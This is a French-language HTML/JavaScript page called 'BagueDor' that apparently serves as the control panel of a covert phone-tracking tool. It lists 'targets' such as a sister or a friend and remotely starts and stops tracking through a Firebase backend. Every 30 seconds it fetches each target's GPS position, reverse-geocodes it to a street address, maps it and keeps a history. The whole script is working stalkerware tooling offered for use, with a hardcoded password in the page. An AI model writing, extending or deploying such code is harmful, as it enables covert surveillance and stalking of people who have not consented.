<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BagueDor 🔥</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #0a0a0a; color: #fff; font-family: monospace; }
    header { padding: 20px; text-align: center; border-bottom: 2px solid #FF4D00; }
    h1 { color: #FF4D00; font-size: 22px; letter-spacing: 2px; }
    h1 span { color: #fff; }
    #device-selector { padding: 15px; text-align: center; background: #111; border-bottom: 1px solid #222; }
    #device-selector label { color: #aaa; font-size: 13px; margin-right: 10px; }
    #device-select { background: #222; color: #FF4D00; border: 1px solid #FF4D00; padding: 8px 15px; border-radius: 6px; font-family: monospace; font-size: 14px; }
    #btn-add { background: none; border: 1px solid #444; color: #aaa; padding: 8px 12px; border-radius: 6px; font-family: monospace; font-size: 13px; margin-left: 10px; cursor: pointer; }
    #controls { display: flex; justify-content: center; gap: 15px; padding: 15px; }
    button { padding: 12px 28px; border: none; border-radius: 8px; font-size: 15px; font-family: monospace; cursor: pointer; font-weight: bold; transition: opacity 0.2s; }
    button:active { opacity: 0.7; }
    #btn-start { background: #FF4D00; color: #fff; }
    #btn-stop { background: #222; color: #aaa; border: 1px solid #333; }
    #status { text-align: center; font-size: 13px; color: #FF4D00; padding-bottom: 8px; min-height: 20px; }
    #info { padding: 10px 15px; text-align: center; font-size: 13px; color: #aaa; background: #111; border-bottom: 1px solid #222; }
    #adresse { padding: 8px 15px; text-align: center; font-size: 13px; color: #fff; background: #1a1a1a; border-bottom: 1px solid #222; }
    #adresse span { color: #FF4D00; }
    #map { width: 100%; height: 45vh; }
    #historique { padding: 15px; }
    #historique h2 { color: #FF4D00; font-size: 14px; margin-bottom: 10px; letter-spacing: 1px; }
    .entry { background: #111; border-left: 3px solid #FF4D00; padding: 8px 12px; margin-bottom: 8px; border-radius: 4px; font-size: 12px; color: #ccc; }
    .entry span { color: #FF4D00; }
  </style>
</head>
<body>
  <header><h1>🔥 BAGUE<span>DOR</span></h1></header>

  <div id="device-selector">
    <label>🎯 Cible :</label>
    <select id="device-select" onchange="switchDevice()">
      <option value="might">might</option>
    </select>
    <button id="btn-add" onclick="addDevice()">+ Ajouter</button>
  </div>

  <div id="controls">
    <button id="btn-start" onclick="sendCommand('start')">▶ START</button>
    <button id="btn-stop" onclick="sendCommand('stop')">■ STOP</button>
  </div>
  <div id="status">En attente...</div>
  <div id="info">Chargement...</div>
  <div id="adresse">🏠 <span>Localisation en cours...</span></div>
  <div id="map"></div>
  <div id="historique">
    <h2>📜 HISTORIQUE</h2>
    <div id="entries"></div>
  </div>

  <script>
    const FIREBASE_URL = "https://baguedor-default-rtdb.firebaseio.com";
    const PASSWORD = "baguedor2026";
    let lastTimestamp = null;
    let history = [];
    let currentDevice = "might";
    let devices = JSON.parse(localStorage.getItem("devices") || '["might"]');

    function checkAuth() {
      const input = prompt("🔐 Mot de passe BagueDor :");
      if (input !== PASSWORD) {
        document.body.innerHTML = "<div style='text-align:center;padding:50px;color:#FF4D00;font-family:monospace;font-size:20px;'>⛔ Accès refusé</div>";
        return false;
      }
      return true;
    }

    function renderDevices() {
      const sel = document.getElementById("device-select");
      sel.innerHTML = devices.map(d =>
        `<option value="${d}" ${d === currentDevice ? "selected" : ""}>${d}</option>`
      ).join("");
    }

    function addDevice() {
      const name = prompt("Nom de la cible (ex: soeur, pote) :");
      if (name && !devices.includes(name)) {
        devices.push(name);
        localStorage.setItem("devices", JSON.stringify(devices));
        renderDevices();
      }
    }

    function switchDevice() {
      currentDevice = document.getElementById("device-select").value;
      lastTimestamp = null;
      history = [];
      document.getElementById("entries").innerHTML = "";
      document.getElementById("status").innerText = "En attente...";
      loadPosition();
    }

    async function getAddress(lat, lng) {
      try {
        const res = await fetch(
          `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`,
          { headers: { "User-Agent": "BagueDor/1.0" } }
        );
        const data = await res.json();
        return data.display_name || "Adresse inconnue";
      } catch {
        return "Adresse inconnue";
      }
    }

    async function sendCommand(cmd) {
      await fetch(`${FIREBASE_URL}/devices/${currentDevice}/command.json`, {
        method: "PUT",
        body: JSON.stringify(cmd)
      });
      document.getElementById("status").innerText =
        cmd === "start" ? `✅ START envoyé → ${currentDevice}` : `🛑 STOP envoyé → ${currentDevice}`;
    }

    async function loadPosition() {
      const res = await fetch(`${FIREBASE_URL}/devices/${currentDevice}/location.json`);
      const data = await res.json();
      if (!data) {
        document.getElementById("info").innerText = "Aucune position disponible";
        return;
      }

      const lat = data.latitude;
      const lng = data.longitude;
      const ts = data.timestamp;
      const time = new Date(ts * 1000).toLocaleString();

      document.getElementById("info").innerHTML =
        `📍 <b style="color:#FF4D00">${lat.toFixed(6)}</b>, <b style="color:#FF4D00">${lng.toFixed(6)}</b> &nbsp;|&nbsp; ⏱ ${time}`;

      const adresse = await getAddress(lat, lng);
      document.getElementById("adresse").innerHTML = `🏠 <span>${adresse}</span>`;

      const mapUrl = `https://maps.google.com/maps?q=${lat},${lng}&z=16&output=embed`;
      document.getElementById("map").innerHTML =
        `<iframe width="100%" height="100%" src="${mapUrl}" frameborder="0"></iframe>`;

      if (lastTimestamp && ts !== lastTimestamp) {
        navigator.vibrate([200, 100, 200]);
        document.getElementById("status").innerText = "🔔 Nouvelle position reçue !";
      }
      lastTimestamp = ts;

      if (!history.length || history[0].ts !== ts) {
        history.unshift({ lat, lng, time, ts, adresse });
        if (history.length > 5) history.pop();
        renderHistory();
      }
    }

    function renderHistory() {
      const el = document.getElementById("entries");
      el.innerHTML = history.map((h, i) =>
        `<div class="entry">${i === 0 ? "🔴" : "⚪"} <span>${h.lat.toFixed(5)}, ${h.lng.toFixed(5)}</span><br>${h.adresse}<br>${h.time}</div>`
      ).join("");
    }

    renderDevices();

    if (checkAuth()) {
      loadPosition();
      setInterval(loadPosition, 30000);
    }
  </script>
</body>
</html>
